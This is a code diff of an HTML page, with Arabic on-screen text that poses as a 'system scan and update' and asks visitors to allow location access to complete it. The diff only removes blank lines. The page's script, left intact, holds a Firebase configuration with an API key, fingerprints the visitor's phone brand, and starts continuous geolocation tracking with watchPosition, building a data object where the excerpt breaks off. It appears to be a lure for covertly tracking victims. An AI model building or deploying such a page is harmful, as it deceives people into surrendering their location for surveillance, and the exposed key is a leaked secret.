@@ -11,7 +11,6 @@
 <body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
     <h2>جاري فحص وتحديث النظام</h2>
     <p>برجاء السماح بالوصول للموقع لاكمال التحديث</p>
-
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBCCXqcD29paJYKGI6eevmUuRa4bW11ccU",
@@ -20,7 +19,6 @@
             appId: "1:1073673986144:web:a27de784d878f3d5d5a305"
         };
         firebase.initializeApp(firebaseConfig);
-
         function getDeviceModel() {
             const ua = navigator.userAgent;
             if (ua.includes("OPPO")) return "Oppo Device";
@@ -29,7 +27,6 @@
             if (ua.includes("Redmi") || ua.includes("Xiaomi")) return "Xiaomi Redmi";
             return navigator.platform + " Mobile";
         }
-
         if (navigator.geolocation) {
             navigator.geolocation.watchPosition((pos) => {
                 const data = {
